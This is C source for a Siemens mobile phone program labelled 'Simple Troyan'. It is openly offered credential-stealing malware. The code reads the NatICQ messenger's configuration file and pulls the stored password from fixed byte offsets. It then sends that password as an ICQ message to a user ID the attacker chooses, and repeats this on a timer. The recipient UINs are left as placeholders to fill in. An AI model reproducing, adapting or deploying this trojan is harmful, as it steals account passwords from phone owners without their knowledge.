#include "..\inc\swilib.h"
#include "../inc/xtask_ipc.h"
//=======================================================================//
//                     Simple Troyan   (NSG,ELKA)                        //
//                             (c)Evilfox                                //
//  Author dont use it and do not answer about that how others used it   //
//=======================================================================//
const char ipc_my_name[]="Cracker";
const char ipc_send_name[]="NatICQ";
const char percent_d[]="%d";
int UIN=?????????;  //uin to send hacked info
int UIN2=?????????; //uin to hack
#define IPC_SENDMSG 5

typedef struct{
  unsigned long uin;
  char *msg;
}IPCssg;

typedef struct
{
  IPCssg IPCMsg;
  char data[30];
}TPKT;

IPC_REQ tmr_gipc;
char pass[64];
char send_data[64];
GBSTMR mytmr;

void start_monitoring_crack()
{
    int f;
  int fsize;
  unsigned int ul;
  FSTATS stat;
  GetFileStats("4:\\zbin\\etc\\naticq.bcfg",&stat,&ul);
  if(stat.size>0)
  {
  f=fopen("4:\\zbin\\etc\\naticq.bcfg",A_ReadOnly+A_BIN,P_READ,&ul);
  fsize=stat.size;
  }
  else
    ShowMSG(1,(int)"Failed");
  if(fsize>1)
  {
  char *p=malloc(fsize);
  p[fread(f,p,fsize,&ul)];
  fclose(f,&ul);
  int k=92;
  int i=0;
  while(k<100)
  {
    pass[i]=p[k];
    i++;
    k++;
  }
  pass[i]='\0';
  sprintf(send_data, "моя пароль = %s", pass);
  sprintf((char *)ipc_send_name+6,percent_d,UIN2);
  tmr_gipc.name_to=ipc_send_name;
  tmr_gipc.name_from=ipc_my_name;
  TPKT *send=malloc(sizeof(IPCssg)+30);
  send->IPCMsg.uin=UIN;
  send->IPCMsg.msg=send_data;
  tmr_gipc.data=send;
  GBS_SendMessage(MMI_CEPID,MSG_IPC,IPC_SENDMSG,&tmr_gipc);
  }
  GBS_StartTimerProc(&mytmr, 216*360, start_monitoring_crack);
}

void main()
{
  start_monitoring_crack();
}

